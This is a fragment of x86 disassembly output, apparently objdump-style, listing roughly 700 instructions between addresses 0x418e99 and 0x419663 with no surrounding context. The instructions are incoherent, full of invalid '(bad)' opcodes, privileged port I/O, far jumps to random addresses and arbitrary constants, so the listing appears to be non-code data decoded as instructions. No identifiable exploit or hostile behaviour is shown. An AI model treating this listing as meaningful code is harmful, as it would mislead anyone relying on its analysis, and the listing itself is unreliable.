  418e99:	test   BYTE PTR [ebx-0x723fd4f2],0x8b
  418ea0:	lds    ebp,FWORD PTR [ecx+edi*1-0x6ced658d]
  418ea7:	dec    edx
  418ea8:	xor    eax,0x14049bae
  418ead:	call   FWORD PTR [eax+0x40475300]
  418eb3:	retf   0x96e
  418eb6:	cdq    
  418eb7:	jg     0x418e8a
  418eb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eba:	enter  0xef69,0x55
  418ebe:	(bad)  
  418ebf:	push   ss
  418ec0:	(bad)  
  418ec1:	test   eax,0xa5e4c4ad
  418ec6:	lds    eax,FWORD PTR [ebp+0x382859d0]
  418ecc:	cmp    eax,DWORD PTR [edx]
  418ece:	in     al,dx
  418ecf:	jl     0x418e9c
  418ed1:	cli    
  418ed2:	shl    DWORD PTR [ebx],1
  418ed4:	or     DWORD PTR [esi+0x3a],ebp
  418ed7:	scas   eax,DWORD PTR es:[edi]
  418ed8:	push   cs
  418ed9:	rcl    DWORD PTR [ecx+0x7645ec63],cl
  418edf:	(bad)  
  418ee0:	xchg   ebx,eax
  418ee1:	ins    DWORD PTR es:[edi],dx
  418ee2:	mov    ch,0x26
  418ee4:	popa   
  418ee5:	or     al,0x81
  418ee7:	mov    cl,0xe2
  418ee9:	jge    0x418f55
  418eeb:	xor    DWORD PTR [esp+edi*2+0x1b],eax
  418eef:	stc    
  418ef0:	mov    ecx,0x92b20af7
  418ef5:	mov    BYTE PTR [edx],ch
  418ef7:	lods   al,BYTE PTR ds:[esi]
  418ef8:	cs stos BYTE PTR es:[edi],al
  418efa:	aam    0x35
  418efc:	dec    edx
  418efd:	and    bl,BYTE PTR [edx]
  418eff:	dec    DWORD PTR [ecx-0x76]
  418f02:	push   ecx
  418f03:	call   0xaf0602d2
  418f08:	jo     0x418e97
  418f0a:	dec    edx
  418f0b:	adc    al,0xe8
  418f0d:	hlt    
  418f0e:	push   ebx
  418f0f:	das    
  418f10:	adc    al,0xb9
  418f12:	frstor [esp+eax*2]
  418f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f16:	retf   0xfb13
  418f19:	loope  0x418f51
  418f1b:	inc    ebp
  418f1c:	mov    DWORD PTR [ecx],ecx
  418f1e:	imul   ecx,DWORD PTR [edx+0x79],0xa78569d8
  418f25:	lahf   
  418f26:	fmul   QWORD PTR [ecx+eiz*8]
  418f29:	mov    esi,0xc400a61
  418f2e:	adc    BYTE PTR [esi],al
  418f30:	mov    eax,ds:0x67d6a750
  418f35:	sbb    al,0xf
  418f37:	mov    al,ds:0xcbbd3440
  418f3c:	fs pusha 
  418f3e:	and    BYTE PTR ds:0x534a29e8,dl
  418f44:	sbb    eax,0x967d172e
  418f49:	or     BYTE PTR [edx-0x19],al
  418f4c:	popf   
  418f4d:	imul   BYTE PTR [eax-0x3d]
  418f50:	sub    DWORD PTR [ebx],edx
  418f52:	xchg   ebx,eax
  418f53:	mov    edi,0x93e305d2
  418f58:	and    al,BYTE PTR [ebx+0x44]
  418f5b:	push   esi
  418f5c:	ja     0x418fbc
  418f5e:	mov    bl,0x9c
  418f60:	or     al,BYTE PTR [edx+eiz*2-0x6f936a6f]
  418f67:	dec    ecx
  418f68:	(bad)  
  418f6a:	enter  0x46a5,0x70
  418f6e:	adc    BYTE PTR [ebp-0x6f5a076b],dh
  418f74:	mov    ah,0xd5
  418f76:	jne    0x418f86
  418f78:	jmp    0xca7b947e
  418f7d:	adc    eax,0x2abe84f7
  418f82:	mov    ebx,0x9d1c21c
  418f87:	sbb    DWORD PTR [eax-0x7d7b9fac],edx
  418f8d:	aas    
  418f8e:	lods   eax,DWORD PTR ds:[esi]
  418f8f:	sbb    al,0x28
  418f91:	xchg   esi,eax
  418f92:	jle    0x418fc8
  418f94:	or     bl,dl
  418f96:	das    
  418f97:	pop    ebx
  418f98:	daa    
  418f99:	jmp    0xffff:0x93d68600
  418fa0:	outs   dx,DWORD PTR ds:[esi]
  418fa1:	call   0x30fec843
  418fa6:	pop    esp
  418fa7:	div    DWORD PTR [esi-0x22]
  418faa:	stc    
  418fab:	push   edi
  418fac:	int3   
  418fad:	push   edi
  418fae:	stos   DWORD PTR es:[edi],eax
  418faf:	xchg   BYTE PTR ds:0xe44852d2,dl
  418fb5:	adc    eax,0x437e2bf6
  418fba:	push   esi
  418fbb:	xor    eax,0x383a0c9a
  418fc0:	adc    al,0x81
  418fc2:	push   ss
  418fc3:	ja     0x419033
  418fc5:	cli    
  418fc6:	mov    dl,0xb1
  418fc8:	pop    ss
  418fc9:	lods   al,BYTE PTR ds:[esi]
  418fca:	jbe    0x41901b
  418fcc:	pop    edx
  418fcd:	fcom   DWORD PTR [ecx-0x1b8f54a4]
  418fd3:	xor    al,0x56
  418fd5:	add    DWORD PTR [esi-0x4],edi
  418fd8:	cmp    ah,0x95
  418fdb:	adc    ecx,esp
  418fdd:	push   edi
  418fde:	push   ss
  418fdf:	call   0x7d07:0x42f08691
  418fe6:	gs cs ret 0x71cc
  418feb:	mov    dl,0xf
  418fed:	push   ss
  418fee:	and    cl,BYTE PTR [ebx-0x6b]
  418ff1:	outs   dx,BYTE PTR ds:[esi]
  418ff2:	pop    eax
  418ff3:	mov    ah,ah
  418ff5:	mov    esi,0xf2936663
  418ffa:	icebp  
  418ffb:	ret    0xb845
  418ffe:	xor    ch,ch
  419000:	or     al,0xf6
  419002:	loope  0x419040
  419004:	mov    ebp,DWORD PTR [eax+ebp*8-0x79a6ec5c]
  41900b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41900c:	sar    cl,1
  41900e:	jnp    0x41907b
  419010:	cli    
  419011:	aaa    
  419012:	adc    al,0xc5
  419014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419015:	xor    bl,BYTE PTR [edx]
  419017:	ror    BYTE PTR [esi-0x11556890],cl
  41901d:	lods   al,BYTE PTR ds:[esi]
  41901e:	xor    al,0xc3
  419020:	pop    es
  419021:	addr16 popa 
  419023:	loope  0x418fb4
  419025:	xchg   ebx,eax
  419026:	mov    bh,0x29
  419028:	lds    eax,FWORD PTR [esi+esi*8-0x6a]
  41902c:	dec    ebx
  41902d:	mov    esp,0xfc284489
  419032:	jmp    FWORD PTR [eax+0x64]
  419035:	sbb    eax,0x5ae2df36
  41903a:	jl     0x419043
  41903c:	inc    esi
  41903d:	call   0x9898a763
  419042:	cwde   
  419043:	and    bh,ch
  419045:	data16 ins BYTE PTR es:[edi],dx
  419047:	mov    al,0x1e
  419049:	pop    ss
  41904a:	mov    dl,0xa
  41904c:	xchg   BYTE PTR [eax+0x31e1a5fc],ah
  419052:	mov    ds:0xbbb3b6f5,al
  419057:	add    al,0x2d
  419059:	push   ecx
  41905a:	sub    al,0x21
  41905c:	push   ecx
  41905d:	repnz push esp
  41905f:	adc    dl,al
  419061:	call   0xe8c8:0x2f0c6e7f
  419068:	lahf   
  419069:	ins    DWORD PTR es:[edi],dx
  41906a:	xor    BYTE PTR [ecx],0x9d
  41906d:	jns    0x419090
  41906f:	mov    dl,0x7c
  419071:	cdq    
  419072:	jo     0x4190b2
  419074:	mov    ds:0x513e7290,al
  419079:	imul   ebp,esi,0xffffffe1
  41907c:	daa    
  41907d:	out    0x3f,al
  41907f:	pop    ss
  419080:	rol    DWORD PTR [eax],cl
  419082:	and    al,0xf9
  419084:	leave  
  419085:	iret   
  419086:	sbb    DWORD PTR [esi-0x7c],eax
  419089:	push   eax
  41908a:	or     eax,0x801ebe1b
  41908f:	mov    ds:0x4632bcf4,al
  419094:	sub    eax,0xabe87099
  419099:	iret   
  41909a:	inc    esi
  41909b:	stc    
  41909c:	lock push edi
  41909e:	xor    al,0x8c
  4190a0:	push   esp
  4190a1:	div    DWORD PTR [eax+eiz*1-0xa45d2f8]
  4190a8:	xor    al,0x72
  4190aa:	xor    bh,al
  4190ac:	lods   eax,DWORD PTR ds:[esi]
  4190ad:	adc    al,0xd
  4190af:	cld    
  4190b0:	ds push edx
  4190b2:	xchg   edx,eax
  4190b3:	sub    DWORD PTR [ecx-0x1],esi
  4190b6:	push   edx
  4190b7:	imul   edx,DWORD PTR [esi],0xffffff86
  4190ba:	stos   DWORD PTR es:[edi],eax
  4190bb:	(bad)  
  4190bc:	mov    ecx,0x94e497b3
  4190c1:	ss jl  0x4190db
  4190c4:	int3   
  4190c5:	inc    ebp
  4190c6:	jno    0x419090
  4190c8:	fmul   DWORD PTR [edx-0x56]
  4190cb:	mov    eax,ds:0x32b25d1
  4190d0:	adc    ebp,ebx
  4190d2:	jecxz  0x4190f6
  4190d4:	loope  0x4190e2
  4190d6:	in     eax,0xa3
  4190d8:	or     al,0xc6
  4190da:	dec    ebp
  4190db:	aas    
  4190dc:	mov    al,ds:0x6fe44ceb
  4190e1:	or     edx,ecx
  4190e3:	(bad)  
  4190e5:	and    ebp,DWORD PTR [ebp+0x24a8538f]
  4190eb:	daa    
  4190ec:	jp     0x419088
  4190ee:	lahf   
  4190ef:	scas   al,BYTE PTR es:[edi]
  4190f0:	cmp    ch,BYTE PTR [ebx+0x77281f29]
  4190f6:	loope  0x419116
  4190f8:	dec    edx
  4190f9:	les    esp,FWORD PTR [ecx+0x79]
  4190fc:	(bad)
  4190ff:	push   0x6363a1c1
  419104:	and    ch,BYTE PTR [edi]
  419106:	mov    dl,0x2
  419108:	cmp    eax,DWORD PTR [edx+ecx*2]
  41910b:	mov    bl,0xe0
  41910d:	(bad)  
  41910e:	xor    eax,0xa512ac22
  419113:	(bad)  
  419114:	call   0xd7aa2521
  419119:	fst    QWORD PTR [edi]
  41911b:	outs   dx,DWORD PTR ds:[esi]
  41911c:	xor    BYTE PTR [edi-0x456d8a20],cl
  419122:	and    al,0xc1
  419124:	shl    DWORD PTR [edx],1
  419126:	stc    
  419127:	cs sub ebx,ebp
  41912a:	aad    0x55
  41912c:	in     al,0xcd
  41912e:	cmp    eax,0x29e49deb
  419133:	(bad)  
  419134:	xchg   ecx,eax
  419135:	test   eax,0x9e117956
  41913a:	popa   
  41913b:	push   edx
  41913c:	cli    
  41913d:	ret    0xbf48
  419140:	sbb    DWORD PTR [ecx+edi*2+0x1ee4c4e6],ebx
  419147:	lods   eax,DWORD PTR ds:[esi]
  419148:	inc    ecx
  419149:	xchg   ecx,eax
  41914a:	adc    BYTE PTR [esi],ch
  41914c:	add    ebx,DWORD PTR [edx]
  41914e:	and    BYTE PTR [esi],ah
  419150:	sbb    dh,dh
  419152:	outs   dx,BYTE PTR ds:[esi]
  419153:	bound  esi,QWORD PTR [edx+0x3d]
  419156:	dec    ecx
  419157:	sub    edi,DWORD PTR [edi+0x38]
  41915a:	mov    eax,DWORD PTR [edx+0xfbfef90]
  419160:	jb     0x419152
  419162:	shl    DWORD PTR [ebp-0x42ee0ae3],cl
  419168:	test   DWORD PTR [ebx-0x7a],edi
  41916b:	pop    ecx
  41916c:	cmp    BYTE PTR [edx],dh
  41916e:	icebp  
  41916f:	mov    esi,0x811728ee
  419174:	pop    esi
  419175:	inc    edx
  419176:	inc    edx
  419177:	ss jns 0x419134
  41917a:	addr16 stc 
  41917c:	daa    
  41917d:	sbb    ebp,0xffffffa1
  419180:	cmp    ch,ch
  419182:	mov    eax,ds:0xc1815069
  419187:	pop    ebx
  419188:	out    dx,al
  419189:	add    ebp,DWORD PTR [ecx]
  41918b:	mov    ecx,0x3b399045
  419190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419191:	adc    DWORD PTR [ecx],0xffffffe2
  419194:	dec    ecx
  419195:	jp     0x41919a
  419197:	jae    0x41911c
  419199:	ror    dl,1
  41919b:	hlt    
  41919c:	adc    ah,BYTE PTR [ebx-0x690976d3]
  4191a2:	div    DWORD PTR [eax]
  4191a4:	ins    BYTE PTR es:[edi],dx
  4191a5:	nop
  4191a6:	push   eax
  4191a7:	mov    ebx,0x6eced1a7
  4191ac:	les    ecx,FWORD PTR [esi]
  4191ae:	push   0x3
  4191b0:	add    eax,0x2e6cbed0
  4191b5:	mov    ah,0x64
  4191b7:	cmp    al,0x12
  4191b9:	stos   DWORD PTR es:[edi],eax
  4191ba:	inc    ecx
  4191bb:	das    
  4191bc:	mov    bl,0xf9
  4191be:	fisttp WORD PTR [ebp-0x556e03]
  4191c4:	dec    esi
  4191c5:	fs or  ah,dl
  4191c8:	mov    dh,0x26
  4191ca:	cmp    DWORD PTR [edx+ebx*1],0x71
  4191ce:	lock daa 
  4191d0:	imul   ebp,ebp,0x53
  4191d3:	(bad)  
  4191d4:	enter  0x799,0x61
  4191d8:	ss push cs
  4191da:	(bad)  
  4191dc:	cmp    esi,DWORD PTR [ebp-0x61]
  4191df:	add    eax,DWORD PTR [edi]
  4191e1:	(bad)  
  4191e2:	enter  0x5e24,0x81
  4191e6:	(bad)
  4191e9:	mov    dl,0x7
  4191eb:	sub    eax,0xcbe796ad
  4191f0:	leave  
  4191f1:	dec    edi
  4191f2:	sbb    ecx,edi
  4191f4:	stos   BYTE PTR es:[edi],al
  4191f5:	hlt    
  4191f6:	leave  
  4191f7:	mov    eax,ds:0xb5fb45e0
  4191fc:	mov    esp,0x23b530c8
  419201:	fld    DWORD PTR [ebp+eiz*4-0x58]
  419205:	vpaddsb ymm3,ymm4,YMMWORD PTR [eax+0x337e2243]
  41920d:	jl     0x4191b5
  41920f:	inc    edx
  419210:	sbb    bl,BYTE PTR [ebx]
  419212:	jne    0x41921d
  419214:	xchg   esi,eax
  419215:	push   ss
  419216:	mov    edx,0x4866ea0e
  41921b:	cdq    
  41921c:	imul   edx,DWORD PTR [esi+0x3e4a7b4],0x9
  419223:	pop    DWORD PTR [eax-0x61]
  419226:	outs   dx,DWORD PTR ds:[esi]
  419227:	sub    BYTE PTR [ebx-0x38],0xa2
  41922b:	dec    ebx
  41922c:	and    eax,0xa8399ac1
  419231:	jno    0x419238
  419233:	jmp    0x41925c
  419235:	inc    esp
  419236:	inc    DWORD PTR [edi]
  419238:	adc    DWORD PTR [ebp-0x316cdfb7],edx
  41923e:	pop    esi
  41923f:	or     esp,DWORD PTR [esi+ebx*1+0x7fdab730]
  419246:	bound  esi,QWORD PTR [edi+0x52e813fa]
  41924c:	retf   
  41924d:	mov    ecx,0xab3028bd
  419252:	push   ecx
  419253:	cmp    DWORD PTR [eax+0xc],eax
  419256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419257:	pop    ebp
  419258:	adc    DWORD PTR [edi],ecx
  41925a:	jnp    0x4192a1
  41925c:	popf   
  41925d:	xchg   esi,eax
  41925e:	enter  0xe577,0x12
  419262:	out    dx,eax
  419263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419264:	test   BYTE PTR [ebp-0x69c18412],bh
  41926a:	shr    bl,1
  41926c:	stos   DWORD PTR es:[edi],eax
  41926d:	and    dl,BYTE PTR [ecx+0x134440aa]
  419273:	mov    ?,WORD PTR [edx+ebx*2]
  419276:	lods   al,BYTE PTR ds:[esi]
  419277:	sub    BYTE PTR [ebp+0x7b],al
  41927a:	add    eax,0xb09ace1c
  41927f:	fdivr  DWORD PTR [edi-0x1135650d]
  419285:	cmc    
  419286:	fs cli 
  419288:	xchg   esp,eax
  419289:	inc    ebp
  41928a:	and    BYTE PTR [eax-0x72e13819],dh
  419290:	mov    ds:0x19fe33b2,eax
  419295:	ret    0x44db
  419298:	aaa    
  419299:	xchg   edx,eax
  41929a:	push   eax
  41929b:	scas   al,BYTE PTR es:[edi]
  41929c:	pop    eax
  41929d:	xor    al,0x9e
  41929f:	mov    edx,0x8741332e
  4192a4:	test   BYTE PTR [edx-0x2c],al
  4192a7:	push   ds
  4192a8:	je     0x419304
  4192aa:	mov    al,0xb1
  4192ac:	mov    edx,0xc51e88be
  4192b1:	add    DWORD PTR [ebx],esp
  4192b3:	or     al,0xa2
  4192b5:	test   BYTE PTR [eax+0x35bce08a],bh
  4192bb:	jnp    0x4192a9
  4192bd:	(bad)  [eax-0x46]
  4192c0:	mov    eax,ds:0xdcfbfe9f
  4192c5:	scas   eax,DWORD PTR es:[edi]
  4192c6:	sahf   
  4192c7:	clc    
  4192c8:	call   0x71ba199d
  4192cd:	outs   dx,BYTE PTR ds:[esi]
  4192ce:	jbe    0x419286
  4192d0:	punpckhdq mm1,mm0
  4192d3:	fcom   st(5)
  4192d5:	loop   0x4192ac
  4192d7:	jl     0x419316
  4192d9:	and    cl,BYTE PTR ds:0x1fc5500b
  4192df:	inc    eax
  4192e0:	(bad)  
  4192e1:	js     0x4192de
  4192e3:	aas    
  4192e4:	lahf   
  4192e5:	inc    esp
  4192e6:	js     0x41929d
  4192e8:	dec    ebx
  4192e9:	in     eax,0x8f
  4192eb:	inc    edi
  4192ec:	add    al,0xb
  4192ee:	int3   
  4192ef:	push   ebx
  4192f0:	dec    edi
  4192f1:	into   
  4192f2:	cli    
  4192f3:	cdq    
  4192f4:	loopne 0x4192cb
  4192f6:	xor    BYTE PTR [ecx+ebx*8-0x52e08687],0x1
  4192fe:	rcr    BYTE PTR [edi+0xa],1
  419301:	cmp    ebx,DWORD PTR [edi+eiz*8]
  419304:	scas   al,BYTE PTR es:[edi]
  419305:	add    ebx,edi
  419307:	stos   DWORD PTR es:[edi],eax
  419308:	sub    BYTE PTR [ebx],0x84
  41930b:	pop    edx
  41930c:	cdq    
  41930d:	mov    eax,0xfa50416d
  419312:	jg     0x419361
  419314:	mov    ds:0x54ea5ea7,al
  419319:	mov    bh,0xf7
  41931b:	xor    eax,0xdaef190b
  419320:	jno    0x4192f9
  419322:	sbb    al,0x65
  419324:	and    DWORD PTR [esi],eax
  419326:	int3   
  419327:	push   es
  419328:	inc    esi
  419329:	aaa    
  41932a:	pop    ss
  41932b:	xor    eax,0xf076891d
  419330:	pop    esi
  419331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419332:	ja     0x4192f0
  419334:	mov    ch,0xd2
  419336:	ja     0x4192dd
  419338:	les    edi,FWORD PTR [edx+ebp*2]
  41933b:	int3   
  41933c:	dec    ecx
  41933d:	stos   DWORD PTR es:[edi],eax
  41933e:	xor    dh,bl
  419340:	push   0x17
  419342:	je     0x41939e
  419344:	bt     DWORD PTR [eax-0xaa53d80],ebp
  41934b:	pop    esp
  41934c:	clc    
  41934d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41934e:	rol    ecx,1
  419350:	lock mov eax,0xfbc9fea6
  419356:	sub    bh,BYTE PTR es:[ebp-0x292e166c]
  41935d:	sub    BYTE PTR [esi+0x38a46e6d],0x1f
  419364:	add    ebx,DWORD PTR [ecx-0x33]
  419367:	inc    esi
  419368:	jns    0x419366
  41936a:	sti    
  41936b:	outs   dx,DWORD PTR ds:[esi]
  41936c:	sub    eax,0xe935fc57
  419371:	xchg   ebp,eax
  419372:	sahf   
  419373:	xchg   BYTE PTR [edi-0x32],al
  419376:	loop   0x419393
  419378:	mov    edx,0x91281a83
  41937d:	sub    edx,DWORD PTR [edi]
  41937f:	stos   DWORD PTR es:[edi],eax
  419380:	pop    esp
  419381:	and    bh,0x28
  419384:	retf   
  419385:	out    0xaf,eax
  419387:	je     0x419348
  419389:	pushf  
  41938a:	sub    edi,DWORD PTR [eax]
  41938c:	ffreep st(5)
  41938e:	or     dh,bh
  419390:	aas    
  419391:	cmp    DWORD PTR [edi],esi
  419393:	std    
  419394:	jecxz  0x419338
  419396:	and    eax,0xb3c28762
  41939b:	enter  0xb717,0x74
  41939f:	pop    ecx
  4193a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193a1:	outs   dx,DWORD PTR ds:[esi]
  4193a2:	rcl    DWORD PTR [edi],0x95
  4193a5:	xlat   BYTE PTR ds:[ebx]
  4193a6:	cmp    BYTE PTR [ebx+0x202651f8],ch
  4193ac:	cs retf 0x5e15
  4193b0:	xor    edx,DWORD PTR [eax]
  4193b2:	pusha  
  4193b3:	mov    dl,bl
  4193b5:	in     al,dx
  4193b6:	jl     0x41934d
  4193b8:	ins    DWORD PTR es:[edi],dx
  4193b9:	rcr    BYTE PTR [eax],0x80
  4193bc:	jne    0x4193c6
  4193be:	in     eax,0x72
  4193c0:	retf   
  4193c1:	mov    eax,ds:0x9e84ef1f
  4193c6:	adc    al,0x7
  4193c8:	in     al,0xe9
  4193ca:	mov    ecx,0xf1a55e15
  4193cf:	ror    DWORD PTR [eax+eax*8],cl
  4193d2:	ins    DWORD PTR es:[edi],dx
  4193d3:	shl    BYTE PTR [ebx],1
  4193d5:	into   
  4193d6:	or     al,0x9
  4193d8:	ds repz pop es
  4193db:	xchg   ecx,eax
  4193dc:	lea    ecx,[esi+ecx*8]
  4193df:	inc    esp
  4193e0:	dec    esp
  4193e1:	rcr    ebx,0x16
  4193e4:	lahf   
  4193e5:	les    ecx,FWORD PTR [ecx]
  4193e7:	xor    ebp,edi
  4193e9:	sti    
  4193ea:	daa    
  4193eb:	pop    edi
  4193ec:	xor    BYTE PTR [edi-0x2c8191ae],al
  4193f2:	lock xchg esp,eax
  4193f4:	pop    ss
  4193f5:	adc    ebp,DWORD PTR [esi+0x484949d9]
  4193fb:	mov    cs,WORD PTR [edi]
  4193fd:	cmp    DWORD PTR [ebx],esi
  4193ff:	xor    ebx,ecx
  419401:	imul   eax,DWORD PTR [edi-0x78bf3d1],0xf11c9cd9
  41940b:	in     al,0xc0
  41940d:	xor    ah,al
  41940f:	xor    esp,DWORD PTR [esi+0x44]
  419412:	imul   esi,DWORD PTR [edi],0x4fa36423
  419418:	loopne 0x4193bd
  41941a:	sub    al,0xaf
  41941c:	or     esi,DWORD PTR [eax+0x575695c1]
  419422:	dec    edx
  419423:	mov    bh,0xdc
  419425:	jp     0x4193e3
  419427:	pop    es
  419428:	imul   edx,ebp,0x9379b2f3
  41942e:	loopne 0x419455
  419430:	or     bh,dh
  419432:	out    0x1b,eax
  419434:	pop    DWORD PTR [ecx-0x5262474f]
  41943a:	bound  esp,QWORD PTR [edx-0x3e]
  41943d:	std    
  41943e:	sbb    BYTE PTR [ebx+0x59],ch
  419441:	or     BYTE PTR [esi-0x40],0x23
  419445:	setle  BYTE PTR [ecx+0x69061ea]
  41944c:	push   edi
  41944d:	xlat   BYTE PTR ds:[ebx]
  41944e:	xchg   edx,eax
  41944f:	or     eax,0xe4d11cc5
  419454:	pop    eax
  419455:	test   al,0xfb
  419457:	xchg   esi,eax
  419458:	mov    ah,0xc3
  41945a:	pushf  
  41945b:	sub    ah,BYTE PTR [esi+0x4d]
  41945e:	dec    ebp
  41945f:	pop    edi
  419460:	out    0x5f,eax
  419462:	adc    eax,0x22bd3ab4
  419467:	mov    edi,0xebd43a5c
  41946c:	cmc    
  41946d:	xchg   ecx,eax
  41946e:	call   0xa004da55
  419473:	es lock add ebp,eax
  419477:	(bad)  
  419478:	popa   
  419479:	cmp    al,0x9b
  41947b:	mov    dh,0x16
  41947d:	inc    esi
  41947e:	push   edx
  41947f:	cdq    
  419480:	and    eax,0x40b87bd2
  419485:	and    DWORD PTR [esi+0x56],eax
  419488:	jne    0x41948f
  41948a:	mov    ah,0x41
  41948c:	stos   BYTE PTR es:[edi],al
  41948d:	xor    BYTE PTR [edi+0x5a],0x14
  419491:	lea    eax,ds:0xfb791f36
  419497:	push   0x24
  419499:	sbb    DWORD PTR [ebp-0x68766d7a],ebp
  41949f:	push   esi
  4194a0:	addr16 aad 0xa6
  4194a3:	cmp    al,0x9e
  4194a5:	leave  
  4194a6:	rcr    BYTE PTR [edx-0x23],cl
  4194a9:	(bad)  
  4194aa:	stc    
  4194ab:	adc    eax,0x71e522fa
  4194b0:	idiv   bl
  4194b2:	jp     0x419454
  4194b4:	dec    eax
  4194b5:	mov    esp,0xb0971508
  4194ba:	out    0x98,al
  4194bc:	pop    ecx
  4194bd:	dec    eax
  4194be:	mov    eax,0x1313e4e7
  4194c3:	imul   esi,esi,0x4016be24
  4194c9:	cmp    DWORD PTR [ebx-0x22],ecx
  4194cc:	imul   esp,DWORD PTR [eax-0x4b],0xffffff86
  4194d0:	sbb    DWORD PTR ds:0xf30b3e76,eax
  4194d6:	mov    ds:0x7892ebb5,al
  4194db:	push   ecx
  4194dc:	sub    dh,BYTE PTR [ebx+0x4f]
  4194df:	outs   dx,DWORD PTR ds:[esi]
  4194e0:	mov    ebp,0x16bdd10d
  4194e5:	test   eax,0x4d126054
  4194ea:	lahf   
  4194eb:	lahf   
  4194ec:	mov    cl,0x34
  4194ee:	and    BYTE PTR [eax-0x5bb1ea85],cl
  4194f4:	mov    ah,0x2f
  4194f6:	lods   al,BYTE PTR ds:[esi]
  4194f7:	and    eax,0x1d379e74
  4194fc:	pop    edi
  4194fd:	sbb    ecx,DWORD PTR [ecx-0x5af76055]
  419503:	sbb    eax,0x527e5784
  419508:	sbb    bl,BYTE PTR [ebx+0x6dc1f248]
  41950e:	pop    ebp
  41950f:	mov    esi,0x2820d0c0
  419514:	icebp  
  419515:	cld    
  419516:	sub    al,0xb
  419518:	(bad)  
  419519:	retf   0x3520
  41951c:	dec    ecx
  41951d:	cdq    
  41951e:	test   BYTE PTR [ebp+ebx*1-0x5ce2b877],dh
  419525:	or     edx,DWORD PTR ds:0x4fcfa963
  41952b:	jp     0x419551
  41952d:	xchg   edx,eax
  41952e:	mov    ch,0x22
  419530:	shl    DWORD PTR ds:[eax-0x70],cl
  419534:	loop   0x4195ad
  419536:	mov    ecx,0x5dc53e09
  41953b:	add    ch,BYTE PTR [edi+0x6f]
  41953e:	mov    ds:0x1748447e,eax
  419543:	fisttp QWORD PTR [edx-0x3cf9fda5]
  419549:	mov    cl,0x55
  41954b:	fisub  WORD PTR [edi+0x6e16d77c]
  419551:	fsubp  st(5),st
  419553:	out    dx,al
  419554:	xor    edi,eax
  419556:	lahf   
  419557:	mov    ch,0x99
  419559:	daa    
  41955a:	xchg   esp,eax
  41955b:	mov    eax,ds:0xfc0e691e
  419560:	mov    bl,0x3
  419562:	js     0x419562
  419564:	mov    ds:0x1aa18e8c,eax
  419569:	jno    0x419592
  41956b:	and    al,0x87
  41956d:	dec    edx
  41956e:	jg     0x4194f9
  419570:	sbb    DWORD PTR [esi-0x53],eax
  419573:	mov    cl,al
  419575:	(bad)
  419578:	cmp    ebp,edi
  41957a:	add    eax,0xe280c54f
  41957f:	stos   BYTE PTR es:[edi],al
  419580:	cs inc edi
  419582:	fisub  WORD PTR [eax+0x57]
  419585:	push   eax
  419586:	popa   
  419587:	adc    DWORD PTR [eax],esi
  419589:	xor    bh,BYTE PTR [edi+0x35]
  41958c:	out    dx,eax
  41958d:	cmp    eax,0x1e71d535
  419592:	icebp  
  419593:	mov    ebp,0x1d35025d
  419598:	in     eax,dx
  419599:	imul   edx,DWORD PTR [ecx-0x6668f803],0x90d1294e
  4195a3:	pop    ds
  4195a4:	dec    edx
  4195a5:	pop    eax
  4195a6:	or     bl,al
  4195a8:	push   0x3b
  4195aa:	add    DWORD PTR [ebx],edi
  4195ac:	xor    eax,0x9f1ccb13
  4195b1:	sub    edx,DWORD PTR [ecx-0x136556d2]
  4195b7:	cs cli 
  4195b9:	jne    0x419579
  4195bb:	lock aaa 
  4195bd:	mov    ds:0x1a603622,al
  4195c2:	add    BYTE PTR [edx+0x6fdb202b],cl
  4195c8:	pushaw 
  4195ca:	hlt    
  4195cb:	lock xor BYTE PTR [edx],ah
  4195ce:	jns    0x4195c7
  4195d0:	push   edx
  4195d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195d2:	mov    edx,0x35281ddf
  4195d7:	xor    BYTE PTR [esi+0x1a],cl
  4195da:	mov    dh,BYTE PTR es:[eax]
  4195dd:	mov    bh,0x34
  4195df:	add    al,0x7f
  4195e1:	and    eax,0xf3faca8b
  4195e6:	aam    0x78
  4195e8:	mov    bh,0xfe
  4195ea:	mov    ebp,0xd61bb018
  4195ef:	(bad)  [ecx+0x5e376cf3]
  4195f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195f6:	in     al,dx
  4195f7:	mov    cl,0xa6
  4195f9:	pop    eax
  4195fa:	push   cs
  4195fb:	repnz adc esi,DWORD PTR [esi]
  4195fe:	dec    ecx
  4195ff:	mov    DWORD PTR [edx-0x1e],edi
  419602:	mov    cs,WORD PTR [esi]
  419604:	imul   BYTE PTR [ebx-0x63]
  419607:	sub    BYTE PTR [edx-0x46],0x77
  41960b:	retf   0x2c73
  41960e:	sub    BYTE PTR [ebp+0x26],bh
  419611:	(bad)  
  419612:	loop   0x419662
  419614:	fs adc eax,0x8b0f3e2b
  41961a:	ret    
  41961b:	xrelease mov DWORD PTR [ecx],esp
  41961e:	pop    ss
  41961f:	push   0x71
  419621:	pop    eax
  419622:	call   0xeb8101b9
  419627:	loop   0x419627
  419629:	aas    
  41962a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41962b:	scas   eax,DWORD PTR es:[edi]
  41962c:	data16 cmc 
  41962e:	jp     0x419601
  419630:	pop    DWORD PTR [ecx]
  419632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419633:	or     bh,BYTE PTR [esi]
  419635:	pop    eax
  419636:	mov    ah,0x81
  419638:	lea    edi,ds:0xdc8683e5
  41963e:	jnp    0x41966f
  419640:	stos   DWORD PTR es:[edi],eax
  419641:	retf   0x4c5e
  419644:	das    
  419645:	jns    0x419651
  419647:	jnp    0x419631
  419649:	scas   eax,DWORD PTR es:[edi]
  41964a:	cmp    ebx,ebx
  41964c:	mov    fs,WORD PTR [ebx+0x1d09d078]
  419652:	or     dh,BYTE PTR [esp+eiz*2-0xd]
  419656:	in     al,dx
  419657:	xor    ah,dh
  419659:	inc    edx
  41965a:	call   0x915501c2
  41965f:	(bad)  
  419660:	dec    DWORD PTR [edi]
  419662:	pop    ecx
  419663:	inc    esi
